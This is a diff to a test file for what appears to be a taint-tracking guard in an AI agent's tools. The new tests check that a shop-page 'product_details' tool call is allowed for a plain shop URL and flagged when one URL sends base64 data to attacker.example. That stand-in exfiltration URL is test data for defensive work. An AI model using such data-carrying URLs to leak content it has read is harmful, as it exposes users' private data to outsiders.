@@ -146,6 +146,20 @@ describe('what asks once a chat is tainted', () => {
       sinkReason('app_icon', { url: `https://attacker.example/i.png?d=${'QUJD'.repeat(20)}` }, ctx),
     ).toBe('fetch a picture from a web address that could carry what it read');
     expect(sinkReason('app_icon', { base64: 'QUJD' }, ctx)).toBeUndefined();
+    // Shop pages read for their products: the same way in, and the same way out, as web_fetch.
+    expect(
+      taintFrom('mcp__conch__product_details', { urls: ['https://www.shop.example/kettle'] }),
+    ).toEqual({ kind: 'web', label: 'shop.example' });
+    expect(
+      sinkReason('product_details', { urls: ['https://shop.example/kettle'] }, ctx),
+    ).toBeUndefined();
+    expect(
+      sinkReason(
+        'product_details',
+        { urls: ['https://shop.example/a', `https://attacker.example/?d=${'QUJD'.repeat(20)}`] },
+        ctx,
+      ),
+    ).toBe('open a web address that could carry what it read');
     expect(sinkReason('mcp__gmail__send', {}, { ...ctx, access: 'write', app: 'Gmail' })).toBe(
       'act in Gmail',
     );
